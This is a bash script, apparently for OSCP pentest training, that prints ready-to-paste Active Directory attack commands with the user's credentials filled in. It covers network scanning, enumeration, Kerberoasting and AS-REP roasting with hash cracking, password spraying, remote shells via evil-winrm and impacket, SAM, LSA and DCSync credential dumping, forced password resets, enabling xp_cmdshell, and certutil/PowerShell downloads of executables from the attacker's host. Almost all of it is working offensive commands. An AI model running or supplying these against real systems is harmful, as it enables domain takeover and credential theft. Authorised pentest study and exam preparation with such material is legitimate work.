#!/bin/bash
# ============================================================
#  OSCP AD Command Generator — You Have a User
#  Prints copy/paste commands with your creds filled in.
#  Usage: bash oscp-ad-user.sh
# ============================================================

read -p "DC IP: " DC_IP
read -p "Domain (e.g. corp.local): " DOMAIN
read -p "Username: " USER
read -p "Password: " PASS
read -p "Target IP (optional, press Enter to skip): " TARGET
read -p "Your IP (for file transfers): " LHOST
read -p "Subnet first 3 octets (e.g. 10.10.10): " SUBNET

echo ""
echo "========================================================"
echo "  OSCP AD METHODOLOGY — $DOMAIN/$USER"
echo "========================================================"

cat <<EOF

================================================================
 STEP 1: PORT SCAN — FIND LIVE HOSTS & SERVICES
================================================================

# Ping sweep
for ip in \$(seq 1 254); do (ping -c 1 -W 1 ${SUBNET}.\$ip &>/dev/null && echo "${SUBNET}.\$ip") & done; wait

# Full port scan on DC
nmap -Pn -sT -sV --open -T4 -p- ${DC_IP} -oN dc_full_scan.txt

# Quick scan common AD ports on subnet
nmap -Pn -sT --open -T4 -p 21,22,53,80,88,135,139,389,443,445,636,1433,3268,3389,5985,5986,8080 ${SUBNET}.0/24 -oN subnet_scan.txt

# What to look for:
#   88  = Kerberos (confirms DC)
#   5985 = WinRM (evil-winrm target)
#   1433 = MSSQL (xp_cmdshell)
#   3389 = RDP
#   2049 = NFS (showmount -e <IP>)
#   21   = FTP (check anonymous)


================================================================
 STEP 2: ENUMERATE SMB SHARES
================================================================

# List shares
netexec smb ${DC_IP} -u '${USER}' -p '${PASS}' --shares

# Spider shares for loot (saves to /tmp/nxc_spider_plus/)
netexec smb ${DC_IP} -u '${USER}' -p '${PASS}' -M spider_plus

# Connect to a share manually
smbclient //${DC_IP}/<SHARENAME> -U '${USER}%${PASS}'

# Null session check
netexec smb ${DC_IP} -u '' -p '' --shares


================================================================
 STEP 3: ENUMERATE USERS & GROUPS
================================================================

# Domain users
netexec smb ${DC_IP} -u '${USER}' -p '${PASS}' --users

# Domain groups
netexec smb ${DC_IP} -u '${USER}' -p '${PASS}' --groups

# RID brute (finds hidden users)
netexec smb ${DC_IP} -u '${USER}' -p '${PASS}' --rid-brute

# rpcclient
rpcclient -U '${USER}%${PASS}' ${DC_IP} -c "enumdomusers"
rpcclient -U '${USER}%${PASS}' ${DC_IP} -c "enumdomgroups"


================================================================
 STEP 4: LDAP ENUMERATION
================================================================

# Full LDAP dump
ldapsearch -x -H ldap://${DC_IP} -D '${USER}@${DOMAIN}' -w '${PASS}' -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" > ldap_dump.txt

# User descriptions (often contain passwords)
ldapsearch -x -H ldap://${DC_IP} -D '${USER}@${DOMAIN}' -w '${PASS}' -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" "(&(objectClass=user)(description=*))" sAMAccountName description

# Find computers
ldapsearch -x -H ldap://${DC_IP} -D '${USER}@${DOMAIN}' -w '${PASS}' -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" "(objectClass=computer)" dNSHostName operatingSystem


================================================================
 STEP 5: BLOODHOUND
================================================================

bloodhound-python -u '${USER}' -p '${PASS}' -d '${DOMAIN}' -ns ${DC_IP} -c All

# Then import the .json files into BloodHound and run:
#   "Shortest Paths to Domain Admin"
#   "Kerberoastable Accounts"
#   "AS-REP Roastable Accounts"


================================================================
 STEP 6: KERBEROASTING
================================================================

# Pull TGS hashes for all SPN accounts
impacket-GetUserSPNs '${DOMAIN}/${USER}:${PASS}' -dc-ip ${DC_IP} -request -outputfile kerberoast.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Crack with john
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
john kerberoast.txt --show


================================================================
 STEP 7: AS-REP ROASTING
================================================================

# Pull hashes for accounts with pre-auth disabled
impacket-GetNPUsers '${DOMAIN}/${USER}:${PASS}' -dc-ip ${DC_IP} -request -outputfile asrep.txt

# Crack with hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Crack with john
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
john asrep.txt --show


================================================================
 STEP 8: CRACKING REFERENCE (hashcat + john)
================================================================

# --- Kerberoast (TGS-REP) ---
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt

# --- AS-REP Roast ---
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt

# --- NTLM hashes (from SAM/secretsdump/NTDS) ---
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
john ntlm_hashes.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

# --- NetNTLMv2 (from Responder / relay captures) ---
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
john netntlmv2.txt --wordlist=/usr/share/wordlists/rockyou.txt

# --- DCC2 / MS Cache 2 (cached domain creds from secretsdump) ---
hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt
john dcc2.txt --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt

# --- AES Kerberos keys (if you pull etype 17/18) ---
hashcat -m 19700 aes_hashes.txt /usr/share/wordlists/rockyou.txt

# --- Show cracked results ---
hashcat --show <hashfile>
john --show <hashfile>

# --- With rules for better coverage ---
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64


================================================================
 STEP 9: QUICK WINS
================================================================

# Password policy (check before spraying)
netexec smb ${DC_IP} -u '${USER}' -p '${PASS}' --pass-pol

# GPP passwords
netexec smb ${DC_IP} -u '${USER}' -p '${PASS}' -M gpp_password

# GMSA passwords
netexec ldap ${DC_IP} -u '${USER}' -p '${PASS}' --gmsa

# Certificate abuse (ADCS)
certipy find -u '${USER}@${DOMAIN}' -p '${PASS}' -dc-ip ${DC_IP} -vulnerable


================================================================
 STEP 10: PASSWORD SPRAYING
================================================================

# Spray a found password across all users
# netexec smb ${DC_IP} -u users.txt -p '<FOUND_PASSWORD>' --continue-on-success

# Kerbrute (no lockout on pre-auth failures)
# kerbrute passwordspray -d ${DOMAIN} --dc ${DC_IP} users.txt '<FOUND_PASSWORD>'


================================================================
 STEP 11: CHECK LATERAL MOVEMENT ACCESS
================================================================

# SMB access (Pwn3d! = local admin)
netexec smb targets.txt -u '${USER}' -p '${PASS}'

# WinRM access
netexec winrm targets.txt -u '${USER}' -p '${PASS}'

# RCE check
netexec smb targets.txt -u '${USER}' -p '${PASS}' -x "whoami"

# With a hash instead
# netexec smb targets.txt -u '${USER}' -H '<NTLM_HASH>'
# netexec winrm targets.txt -u '${USER}' -H '<NTLM_HASH>'


================================================================
 STEP 12: GET A SHELL
================================================================

# WinRM (best option — port 5985)
evil-winrm -i ${TARGET:-\<TARGET_IP\>} -u '${USER}' -p '${PASS}'

# PSExec (needs admin + writable share)
impacket-psexec '${DOMAIN}/${USER}:${PASS}'@${TARGET:-\<TARGET_IP\>}

# WMIExec (stealthier)
impacket-wmiexec '${DOMAIN}/${USER}:${PASS}'@${TARGET:-\<TARGET_IP\>}

# SMBExec
impacket-smbexec '${DOMAIN}/${USER}:${PASS}'@${TARGET:-\<TARGET_IP\>}

# Atexec (task scheduler)
impacket-atexec '${DOMAIN}/${USER}:${PASS}'@${TARGET:-\<TARGET_IP\>} "whoami"

# With a hash
# evil-winrm -i ${TARGET:-\<TARGET_IP\>} -u '${USER}' -H '<NTLM_HASH>'
# impacket-psexec '${DOMAIN}/${USER}'@${TARGET:-\<TARGET_IP\>} -hashes '<NTLM_HASH>'
# impacket-wmiexec '${DOMAIN}/${USER}'@${TARGET:-\<TARGET_IP\>} -hashes '<NTLM_HASH>'


================================================================
 STEP 13: DUMP CREDENTIALS
================================================================

# SAM (local hashes)
netexec smb ${TARGET:-\<TARGET_IP\>} -u '${USER}' -p '${PASS}' --sam

# LSA secrets
netexec smb ${TARGET:-\<TARGET_IP\>} -u '${USER}' -p '${PASS}' --lsa

# secretsdump (SAM + LSA + cached creds)
impacket-secretsdump '${DOMAIN}/${USER}:${PASS}'@${TARGET:-\<TARGET_IP\>}

# DCSync (need DA or replication rights)
impacket-secretsdump '${DOMAIN}/${USER}:${PASS}'@${DC_IP} -just-dc

# DCSync single user
impacket-secretsdump '${DOMAIN}/${USER}:${PASS}'@${DC_IP} -just-dc-user Administrator

# NTDS.dit full dump
netexec smb ${DC_IP} -u '${USER}' -p '${PASS}' --ntds


================================================================
 STEP 14: PRIVILEGE ESCALATION — ACL ABUSE
================================================================

# (Check BloodHound for which of these apply)

# GenericWrite on user → Targeted Kerberoast
# python3 targetedKerberoast.py -d ${DOMAIN} -u '${USER}' -p '${PASS}' --dc-ip ${DC_IP}

# ForceChangePassword
# rpcclient -U '${USER}%${PASS}' ${DC_IP} -c "setuserinfo2 <target_user> 23 'NewP@ss123!'"

# AddMember (add yourself to a group)
# net rpc group addmem "<GROUP>" "${USER}" -U '${DOMAIN}/${USER}%${PASS}' -S ${DC_IP}

# Shadow Credentials (GenericWrite on computer)
# certipy shadow auto -u '${USER}@${DOMAIN}' -p '${PASS}' -account '<COMPUTER$>'

# ADCS abuse (if certipy find showed vulnerable templates)
# certipy req -u '${USER}@${DOMAIN}' -p '${PASS}' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -dc-ip ${DC_IP}


================================================================
 STEP 15: MSSQL (if port 1433 is open)
================================================================

# Connect
impacket-mssqlclient '${DOMAIN}/${USER}:${PASS}'@${TARGET:-\<TARGET_IP\>} -windows-auth

# Once connected — enable xp_cmdshell:
#   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
#   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
#   EXEC xp_cmdshell 'whoami';

# netexec MSSQL
netexec mssql ${TARGET:-\<TARGET_IP\>} -u '${USER}' -p '${PASS}' -q "SELECT name FROM master.dbo.sysdatabases"


================================================================
 STEP 16: FILE TRANSFERS
================================================================

# Start HTTP server on Kali
python3 -m http.server 80

# Download on Windows target (paste in shell)
certutil -urlcache -split -f http://${LHOST}/file.exe C:\\Temp\\file.exe
iwr -uri http://${LHOST}/file.exe -outfile C:\\Temp\\file.exe
(New-Object Net.WebClient).DownloadFile("http://${LHOST}/file.exe","C:\\Temp\\file.exe")

# SMB share (Kali side)
impacket-smbserver share \$(pwd) -smb2support
# Windows side: copy \\\\${LHOST}\\share\\file.exe C:\\Temp\\


================================================================
 METHODOLOGY REMINDER
================================================================

 1. Scan ports → find services
 2. Enumerate SMB/LDAP/users/groups
 3. Run BloodHound → find attack paths
 4. Kerberoast + AS-REP Roast → crack hashes
 5. Check quick wins (GPP, descriptions, GMSA, ADCS)
 6. Spray any found passwords
 7. Check lateral movement access with new creds
 8. Get a shell → dump creds → repeat
 9. Escalate via ACL abuse / ADCS / MSSQL
10. DCSync once you have DA

EOF
